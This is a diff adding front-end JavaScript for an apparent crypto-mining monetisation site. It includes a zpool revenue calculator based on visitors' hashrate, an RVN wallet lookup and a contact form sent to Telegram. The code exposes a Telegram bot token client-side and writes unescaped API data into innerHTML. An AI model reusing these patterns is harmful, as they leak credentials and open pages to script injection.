+        const dailyUsers = parseInt(document.getElementById("calc-users")?.value)    || 1000;
+        const hsPerUser  = parseInt(document.getElementById("calc-hashrate")?.value) || 40;
+        const sessionMin = parseInt(document.getElementById("calc-session")?.value)  || 5;
+        const algoKey    = document.getElementById("calc-algo")?.value               || "minotaurx";
+      
+        if (!zpoolStatus) return;
+      
+        const avgConcurrent = dailyUsers * (sessionMin / (24 * 60));
+        const totalHs = avgConcurrent * hsPerUser;
+      
+        const rev      = calcRevenue(totalHs, algoKey);
+        const grossDay = rev.usdDay;
+        const grossMon = grossDay * 30;
+      
+        // ── Pool fee — HARD-CODED ──
+        const feeMult = 1 - (POOL_FEE / 100);
+        const netDay  = grossDay * feeMult;
+        const netMon  = grossMon * feeMult;
+      
+        // ── Best case: all users mining simultaneously ──
+        const peakHs   = dailyUsers * hsPerUser;
+        const revPeak  = calcRevenue(peakHs, algoKey);
+        const bestDay  = revPeak.usdDay * feeMult;
+        const bestMon  = bestDay * 30;
+      
+        // ── Update DOM ──
+        const setText = (id, text) => {
+          const el = document.getElementById(id);
+          if (el) el.textContent = text;
+        };
+      
+        setText("calc-gross-daily",   formatUSD(grossDay));
+        setText("calc-gross-monthly", formatUSD(grossMon));
+        setText("calc-daily",         formatUSD(netDay));
+        setText("calc-monthly",       formatUSD(netMon));
+        setText("calc-btc-daily",     formatBTC(rev.btcDay) + " BTC");
+        setText("calc-btc-monthly",   formatBTC(rev.btcMonth) + " BTC");
+      
+        // ── Algo live estimate line ──
+        const algo  = zpoolStatus[algoKey];
+        const estEl = document.getElementById("calc-algo-estimate");
+        if (estEl && algo) {
+          const estBTC     = parseFloat(algo.estimate_current) || 0;
+          const mbtcMh     = parseFloat(algo.mbtc_mh_factor)   || 1000;
+          const nativeUnit = getNativeUnit(mbtcMh);
+          const estUSD     = estBTC * btcPriceUSD;
+      
+          estEl.innerHTML = `
+            <span class="text-accent">${formatBTC(estBTC)}</span> BTC/${nativeUnit}/day
+            &nbsp;|&nbsp;
+            ≈ <span class="text-accent">${formatUSD(estUSD)}</span>/${nativeUnit}/day
+            &nbsp;|&nbsp;
+            Pool: <span>${algo.workers}</span> workers
+            &nbsp;|&nbsp;
+            Fee: <span>${POOL_FEE}%</span>  <!-- ← hard-coded -->
+          `;
+        }
+      
+        const timeEl = document.getElementById("calc-last-updated");
+        if (timeEl) timeEl.textContent = "Updated: " + new Date().toLocaleTimeString();
+      }
+      
+      // ═══════════════════════════════════════
+      // WALLET LOOKUP
+      // ═══════════════════════════════════════
+      
+      async function lookupWallet() {
+  const address   = document.getElementById("wallet-address")?.value?.trim() || DEFAULT_WALLET;
+  const resultDiv = document.getElementById("wallet-result");
+
+  if (!resultDiv) return;
+  resultDiv.innerHTML = '<div class="text-muted-fg animate-pulse py-4">Fetching wallet data from zpool…</div>';
+
+  const wallet = await fetchWallet(address);
+
+  if (!wallet) {
+    resultDiv.innerHTML = `
+      <div class="text-red-400 py-4">
+        Failed to fetch wallet data. Ensure the address is valid and has been used on zpool.ca.
+      </div>`;
+    return;
+  }
+
+  // ── All zpool amounts are RVN when using an RVN address ──
+  const parseRVN = (v) => parseFloat(v) || 0;
+  const unsold   = parseRVN(wallet.unsold);
+  const balance  = parseRVN(wallet.balance);
+  const unpaid   = parseRVN(wallet.unpaid);
+  const paid24h  = parseRVN(wallet.paid24h);
+  const total    = parseRVN(wallet.total);
+
+  // ── RVN formatting ──
+  const formatRVN = (rvn) => {
+    if (rvn === 0) return "0.00";
+    if (rvn < 0.01) return rvn.toFixed(6);
+    if (rvn < 1) return rvn.toFixed(4);
+    if (rvn < 1000) return rvn.toFixed(2);
+    return rvn.toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+  };
+
+  // ── Conversions ──
+  const rvnToUSD = (rvn) => rvn * rvnPriceUSD;
+  const rvnToBTC = (rvn) => {
+    if (btcPriceUSD <= 0) return 0;
+    return (rvn * rvnPriceUSD) / btcPriceUSD;
+  };
+
+  // ── Balance row helper ──
+  const balRow = (label, rvn, accent = false) => {
+    const usdEquiv = rvnToUSD(rvn);
+    const btcEquiv = rvnToBTC(rvn);
+    return `
+      <div class="bg-bg p-4 md:p-5">
+        <span class="text-xs uppercase tracking-widest text-muted-fg block mb-1">${label}</span>
+        <span class="font-bold text-sm md:text-base ${accent ? 'text-accent' : ''}">${formatRVN(rvn)} RVN</span>
+        <span class="text-xs text-muted-fg block">≈ ${formatUSD(usdEquiv)}</span>
+        <span class="text-xs text-muted-fg block">≈ ${formatBTC(btcEquiv)} BTC</span>
+      </div>`;
+  };
+
+  // ── Active miners ──
+  const miners = wallet.miners || [];
+  const minersHTML = miners.length > 0
+    ? miners.map(m => `
+        <div class="bg-bg border border-border p-4">
+          <div class="flex justify-between items-center mb-2">
+            <span class="font-bold text-sm uppercase tracking-tight">${m.algo || "Unknown"}</span>
+            <span class="text-accent text-xs">Diff: ${m.difficulty}</span>
+          </div>
+          <div class="grid grid-cols-2 gap-2 text-xs text-muted-fg">
+            <span>Accepted: ${(m.accepted / 1e6).toFixed(2)}M shares</span>
+            <span>Rejected: ${m.rejected}</span>
+            <span>Hashrate: ${m.hashrate || "—"}</span>
+            <span>Last share: ${m.lastshare ? new Date(m.lastshare * 1000).toLocaleTimeString() : "—"}</span>
+          </div>
+        </div>
+      `).join("")
+    : '<div class="text-muted-fg text-sm py-2">No active miners</div>';
+
+  // ── Recent payouts ──
+  const payouts = wallet.payouts || [];
+  const payoutsHTML = payouts.length > 0
+    ? payouts.slice(0, 10).map(p => {
+        const pRVN = parseRVN(p.amount);
+        const pUSD = rvnToUSD(pRVN);
+        return `
+          <div class="flex justify-between items-center border-b border-border pb-2 text-sm">
+            <div>
+              <span class="text-muted-fg">${new Date(p.time * 1000).toLocaleDateString()}</span>
+              <span class="text-accent font-bold ml-2">${formatRVN(pRVN)} RVN</span>
+              <span class="text-xs text-muted-fg ml-2">≈ ${formatUSD(pUSD)}</span>
+            </div>
+            <span class="text-xs text-muted-fg">${formatBTC(rvnToBTC(pRVN))} BTC</span>
+          </div>`;
+      }).join("")
+    : '<div class="text-muted-fg text-sm py-2">No recent payouts</div>';
+
+  // ── Render ──
+  resultDiv.innerHTML = `
+    <div class="space-y-6">
+
+      <!-- Balance grid -->
+      <div class="grid grid-cols-2 md:grid-cols-5 gap-px bg-border">
+        ${balRow("Unsold", unsold)}
+        ${balRow("Balance", balance)}
+        ${balRow("Unpaid", unpaid)}
+        ${balRow("Paid 24h", paid24h, true)}
+        ${balRow("Total Earned", total)}
+      </div>
+
+      <!-- Address -->
+      <div class="text-xs text-muted-fg font-mono break-all">
+        Address: <span class="text-fg">${address}</span>
+      </div>
+
+      <!-- Live conversion rates -->
+      <div class="border border-border p-4 bg-muted">
+        <div class="flex flex-wrap items-center gap-4 text-xs">
+          <span class="text-muted-fg uppercase tracking-widest">Live Rates:</span>
+          <span class="font-bold">1 RVN = ${formatUSD(rvnPriceUSD)}</span>
+          <span class="text-muted-fg">|</span>
+          <span class="font-bold">1 BTC = ${formatUSD(btcPriceUSD)}</span>
+          <span class="text-muted-fg">|</span>
+          <span class="font-bold text-accent">1 BTC ≈ ${Math.round(btcPriceUSD / rvnPriceUSD).toLocaleString()} RVN</span>
+        </div>
+      </div>
+
+      <!-- Miners -->
+      <div>
+        <h4 class="text-sm font-bold uppercase tracking-widest mb-3">
+          Active Miners <span class="text-muted-fg">(${miners.length})</span>
+        </h4>
+        <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-3">
+          ${minersHTML}
+        </div>
+      </div>
+
+      <!-- Payouts -->
+      <div>
+        <h4 class="text-sm font-bold uppercase tracking-widest mb-3">
+          Recent Payouts <span class="text-muted-fg">(${payouts.length})</span>
+        </h4>
+        <div class="space-y-2">${payoutsHTML}</div>
+      </div>
+
+    </div>
+  `;
+}
+      // ═══════════════════════════════════════
+      // REFRESH COUNTDOWN
+      // ═══════════════════════════════════════
+      
+      function startCountdown() {
+        const timerEl = document.getElementById("algo-refresh-timer");
+        refreshCountdown = 60;
+      
+        const tick = () => {
+          refreshCountdown--;
+          if (timerEl) timerEl.textContent = `Next refresh in ${refreshCountdown}s`;
+          if (refreshCountdown <= 0) {
+            refreshAllData();
+          }
+        };
+      
+        if (window._countdownInterval) clearInterval(window._countdownInterval);
+        window._countdownInterval = setInterval(tick, 1000);
+      }
+      
+      // ═══════════════════════════════════════
+      // MASTER REFRESH
+      // ═══════════════════════════════════════
+      
+      async function refreshAllData() {
+        await fetchBTCPrice();
+        await fetchZpoolStatus();
+      
+        updateHeroStats();
+        updateMarquee();
+        updateAlgoTable();
+        updateRevenueCalculator();
+      
+        startCountdown();
+      }
+      
+      // ═══════════════════════════════════════
+      // SCROLL REVEAL OBSERVER
+      // ═══════════════════════════════════════
+      const observer = new IntersectionObserver(
+        (entries) => {
+          entries.forEach((entry) => {
+            if (entry.isIntersecting) entry.target.classList.add("visible");
+          });
+        },
+        { threshold: 0.1, rootMargin: "0px 0px -50px 0px" }
+      );
+      document.querySelectorAll(".scroll-reveal").forEach((el) => observer.observe(el));
+      
+      // ═══════════════════════════════════════
+      // NAVBAR SHADOW ON SCROLL
+      // ═══════════════════════════════════════
+      const nav = document.querySelector("nav");
+      window.addEventListener("scroll", () => {
+        nav?.classList.toggle("shadow-lg", window.scrollY > 50);
+      });
+      
+      // ═══════════════════════════════════════
+      // CONTACT FORM → TELEGRAM
+      // ═══════════════════════════════════════
+      const form       = document.getElementById("contactForm");
+      const submitBtn  = document.getElementById("submitBtn");
+      const formStatus = document.getElementById("formStatus");
+      
+      async function sendToTelegram(text) {
+        return fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text, parse_mode: "HTML", disable_web_page_preview: true }),
+        });
+      }
+      
+      function showStatus(msg, type) {
+        formStatus.textContent = msg;
+        formStatus.classList.remove("hidden", "text-accent", "text-red-400");
+        formStatus.classList.add(type === "success" ? "text-accent" : "text-red-400");
+        setTimeout(() => formStatus.classList.add("hidden"), 6000);
+      }
+      
+      form?.addEventListener("submit", async (e) => {
+        e.preventDefault();
+        const firstName = document.getElementById("firstName").value.trim();
+        const lastName  = document.getElementById("lastName").value.trim();
+        const email     = document.getElementById("email").value.trim();
+        const message   = document.getElementById("message").value.trim();
+      
+        if (!email || !message) { showStatus("Email and message are required.", "error"); return; }
+      
+        submitBtn.disabled = true;
+        submitBtn.textContent = "Sending…";
+      
+        const msg = [
+          `<b>📩 New Contact Message</b>`,
+          `━━━━━━━━━━━━━━━━━━━━`,
+          `<b>Name:</b>  ${firstName || "—"} ${lastName || "—"}`,
+          `<b>Email:</b> ${email}`,
+          `<b>Time:</b>  ${new Date().toISOString()}`,
+          ``,
+          `<b>Message:</b>`,
+          message,
+        ].join("\n");
+      
+        try {
+          const res  = await sendToTelegram(msg);
+          const data = await res.json();
+          data.ok ? (showStatus("Message sent successfully! ✓", "success"), form.reset()) : showStatus("Failed to send.", "error");
+        } catch {
+          showStatus("Network error. Please try again.", "error");
+        } finally {
+          submitBtn.disabled = false;
+          submitBtn.textContent = "Send Message →";
+        }
+      });
+      
+      // ═══════════════════════════════════════
+      // CALCULATOR EVENT LISTENERS
+      // ═══════════════════════════════════════
+      document.getElementById("calc-algo")?.addEventListener("change", updateRevenueCalculator);
+      document.getElementById("calc-users")?.addEventListener("input", updateRevenueCalculator);
+      document.getElementById("calc-hashrate")?.addEventListener("input", updateRevenueCalculator);
+      document.getElementById("calc-session")?.addEventListener("input", updateRevenueCalculator);
+      
+      // ═══════════════════════════════════════
+      // INIT — run on DOM ready
+      // ═══════════════════════════════════════
+      document.addEventListener("DOMContentLoaded", async () => {
+        await refreshAllData();
+      
+        const walletInput = document.getElementById("wallet-address");
+        if (walletInput) walletInput.value = DEFAULT_WALLET;
+      
+        const algoSelect = document.getElementById("calc-algo");
+        if (algoSelect && zpoolStatus) {
+          Array.from(algoSelect.options).forEach(opt => {
+            if (!zpoolStatus[opt.value]) opt.disabled = true;
+          });
+        }
+      });
+      </script>
+  </body>
+</html>
